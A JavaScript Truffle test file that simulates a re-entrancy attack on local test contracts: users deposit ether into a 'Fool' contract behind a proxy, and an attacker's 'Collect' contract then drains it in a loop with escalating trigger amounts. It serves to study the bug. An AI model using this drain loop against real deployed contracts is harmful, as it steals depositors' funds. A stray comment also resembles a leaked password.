

const Fool = artifacts.require('Fool');
const Barr = artifacts.require('Barr');
const Collect = artifacts.require('Collect');
const _Proxy = artifacts.require("ProxyMulti");
const DataProxy = artifacts.require("DataProxy");
var deployedConf = require("../deployedConf.json");
const util = require("util");
// var Web3 = require("web3");
// var web3 = new Web3(new Web3.providers.HttpProvider("http://localhost:7545"));
// var provider = new Web3.providers.HttpProvider("http://localhost:7545");
// var contract = require("truffle-contract");

contract('Re-entrancy test', async (accounts) => 
{
    const zero = 0x0000000000000000000000000000000000000000;
    const ether = web3.utils.toWei('1', 'ether');

    let owner = accounts[0];
    console.log(`victim address is ${owner}`);
    let attacker = accounts[9];
    console.log(`attacker address is ${attacker}`);

    let user1 = accounts[5];
    let user2 = accounts[6];
    let user3 = accounts[7];

    let foolProxy;
    let barrProxy;
    let collectContract;
    let _proxy;
    let dataProxy;
//swinburne123
    before(async () => 
    {
        console.log(`Setting some global variable for testing`);
        // await web3.eth.sendTransaction(
        //     { 
        //         from: attacker, 
        //         to: owner.address, 
        //         value: web3.utils.toBN(ether).mul(web3.utils.toBN(100)) 
        //     });
        _fool = await Fool.deployed({ from: owner });
        _barr = await Barr.deployed({ from: owner });

        foolProxy = await Fool.at(deployedConf.proxyMulti.address);
        barrProxy = await Barr.at(deployedConf.proxyMulti.address);
        // console.log(`honeyProxy contract is: ${util.inspect(foolProxy, false, null)}`);
        collectContract = await Collect.deployed(
           {arguments: [deployedConf.proxyMulti.address]}, { from: attacker });
        // console.log(`deployed contract Collect successfully, ${util.inspect(collectContract, false, null)}`);
        _proxy = await _Proxy.deployed({ from: owner });
        dataProxy = await DataProxy.deployed({from: owner});
        //set dataProxy contract address on proxy
        try {
            await _proxy.setDataCtrtAddress(dataProxy.address);
            _dataProxyAddr = await _proxy.getDataCtrtAddress();
            console.log(`dataProxy address set on proxy contract is: ${_dataProxyAddr}`);
        } catch (err) {
            console.log(`error with set or get address of dataProxy on proxy contract`);
        }
        //  console.log(`deployed contract Proxy successfully: ${util.inspect(_proxy, false, null)}`);
        const _Addresses = await _proxy.getCtrtAddresses();
        console.log(`address of fool set in proxy: ${_Addresses[0]}`);
        console.log(`address of barr set in proxy: ${_Addresses[1]}`);
        foolAbiStringArray = foolProxy.abi;
        var foolfunctionArrays = [];
        for (var i =0; i < foolAbiStringArray.length; i++) {
          if (foolAbiStringArray[i].type == "function") {
             foolfunctionArrays.push(foolAbiStringArray[i]);
          }
        }
        // var foolstringArray = [];
        var foolfunctionSignatures = [];
        for (var i =0; i < foolfunctionArrays.length; i++) {
            foolfunctionSignatures.push(web3.eth.abi.encodeFunctionSignature(foolfunctionArrays[i]));
        }
        try {
            await _proxy.addContract(_fool.address, foolfunctionSignatures);
        } catch (err) {
            console.log(`adding fool contract to proxy failed: ${err}`);
        }
        barrAbiStringArray = barrProxy.abi;
        var barrfunctionArrays = [];
        for (var i =0; i < barrAbiStringArray.length; i++) {
          if (barrAbiStringArray[i].type == "function") {
             barrfunctionArrays.push(barrAbiStringArray[i]);
          }
        }

        var barrfunctionSignatures = [];
        for (var i =0; i < barrfunctionArrays.length; i++) {
            barrfunctionSignatures.push(web3.eth.abi.encodeFunctionSignature(barrfunctionArrays[i]));
        }
        //adding fool and barr to proxy
        try {
            await _proxy.addContract(_barr.address, barrfunctionSignatures);
        } catch (err) {
            console.log(`adding barr contract to proxy failed: ${err}`);
        }
    });
    
    describe('get() test', () => 
    {
        it('should returns function signature', async () => {
            var _foo_signatures = await _proxy.getFuncSigns(_fool.address);
            console.log(`list of function signature of fool: ${util.inspect(_foo_signatures, false, null)}`);
            var _bar_signatures = await _proxy.getFuncSigns(_barr.address);
            console.log(`list of function signature of barr: ${util.inspect(_bar_signatures, false, null)}`);
        })
        it('attacker uses the re-entrancy bug to drain funds', async () => 
        {
            console.log('accounts status before hack');
            
            let ownerBalance = await web3.eth.getBalance(owner);
            let attackerBalance = await web3.eth.getBalance(attacker);

            let user1Balance = await web3.eth.getBalance(user1);
            let user2Balance = await web3.eth.getBalance(user2);
            let user3Balance = await web3.eth.getBalance(user3);

            console.log('\nowner balance: ' + ownerBalance / ether);

            console.log('attacker balance: ' + attackerBalance / ether);
            console.log('user #1 balance: ' + user1Balance / ether);
            console.log('user #2 balance: ' + user2Balance / ether);
            console.log('user #3 balance: ' + user3Balance / ether);
            // console.log(`honeyProxy contract is: ${util.inspect(foolProxy, false, null)}`);
            
            await foolProxy.fool_put(
                { 
                    from: user1, 
                    value: web3.utils.toBN(ether).mul(web3.utils.toBN(40)) 
                });
            console.log(`balance of user 1 on fool is ${await foolProxy.getBalanceOf(user1) / ether}`);
            await foolProxy.fool_put(
                { 
                    from: user2, 
                    value: web3.utils.toBN(ether).mul(web3.utils.toBN(40)) 
                });
            console.log(`balance of user 2 on fool is ${await foolProxy.getBalanceOf(user2) / ether}`);
            await foolProxy.fool_put(
                { 
                    from: user3, 
                    value: web3.utils.toBN(ether).mul(web3.utils.toBN(40)) 
                });
            console.log(`balance of user 3 on fool is ${await foolProxy.getBalanceOf(user3) / ether}`);
            console.log(`balance of proxyMulti on fool is ${await foolProxy.getBalanceOf(_proxy.address) /ether}`);
            console.log(`balance of collect on fool is ${await foolProxy.getBalanceOf(collectContract.address) /ether}`);
            //check the signature of the function at dataProxy contract
            var _funcSignature = await dataProxy.getFuncSignature();
            console.log(`function signature of fool_put is : ${_funcSignature}`);

            let foolProxyBalance = await web3.eth.getBalance(foolProxy.address);
            let collectContractBalance = await web3.eth.getBalance(collectContract.address);
            var dataProxyBalance = await web3.eth.getBalance(dataProxy.address);

            console.log('fool balance: ' + foolProxyBalance / ether);
            console.log('collect balance: ' + collectContractBalance / ether);
            console.log('dataProxy balance: ' + dataProxyBalance / ether);

            console.log('\nperforming attack...');
            let currentIteration = 0;
            let maxIterations = 10;
            let triggerAmount = web3.utils.toBN(0.01 * ether);
            let leftoverAmount = web3.utils.toBN(0.001 * ether);
            let collectIterations = web3.utils.toBN(10);
            while(web3.utils.toBN(foolProxyBalance)
                .gt(web3.utils.toBN(leftoverAmount))
                && maxIterations > currentIteration)
            {
                currentIteration++;
                console.log('\niteration ' + currentIteration);
                
                console.log('trigger amount ' + triggerAmount / ether);
               console.log(`attacker address is ${attacker}`);
               const _getOwner = await collectContract.getOwner();
               console.log(`owner = attacker address = ${_getOwner}`);
                let amountToSend = web3.utils.toBN(triggerAmount);
                await collectContract.collect(
                    collectIterations, 
                    { 
                        from: attacker, 
                        value: amountToSend
                    });
                console.log(`attacker sent amount: ${amountToSend}`);
                foolProxyBalance = await web3.eth.getBalance(foolProxy.address);
                collectContractBalance = await web3.eth.getBalance(collectContract.address);
                attackerBalance = await web3.eth.getBalance(attacker);

                console.log('fool balance ' + foolProxyBalance / ether);
                console.log('collect balance ' + collectContractBalance / ether);
                console.log('attacker balance ' + attackerBalance / ether);

                // await collectContract.withdraw(
                //     attacker, 
                //     web3.utils.toBN(collectContractBalance).mul(web3.utils.toBN(5)).div(web3.utils.toBN(10)), 
                //     { from: attacker });
                // console.log(`transferred amount from collect to attacker: 
                // ${ web3.utils.toBN(collectContractBalance).mul(web3.utils.toBN(5)).div(web3.utils.toBN(10))}`);

                foolProxyBalance = await web3.eth.getBalance(foolProxy.address);
                collectContractBalance = await web3.eth.getBalance(collectContract.address);
                attackerBalance = await web3.eth.getBalance(attacker);

                console.log('fool balance ' + foolProxyBalance / ether);
                console.log('collect balance ' + collectContractBalance / ether);
                console.log('attacker balance ' + attackerBalance / ether);

                triggerAmount = web3.utils.toBN(triggerAmount).mul(web3.utils.toBN(10));
                if(web3.utils.toBN(triggerAmount).gt(web3.utils.toBN(attackerBalance)))
                {
                    triggerAmount = web3.utils.toBN(attackerBalance).mul(web3.utils.toBN(8)).div(web3.utils.toBN(10));
                }
                if(web3.utils.toBN(triggerAmount).gt(web3.utils.toBN(foolProxyBalance)))
                {
                    triggerAmount = web3.utils.toBN(foolProxyBalance);
                }
            }

            await collectContract.kill(attacker, { from: attacker });
            console.log('collect contract killed');

            console.log('\nend');
            
            foolProxyBalance = await web3.eth.getBalance(foolProxy.address);
            collectContractBalance = await web3.eth.getBalance(collectContract.address);
            attackerBalance = await web3.eth.getBalance(attacker);

            console.log('fool balance ' + foolProxyBalance / ether);
            console.log('collect balance ' + collectContractBalance / ether);
            console.log('attacker balance ' + attackerBalance / ether);
        });
    });

});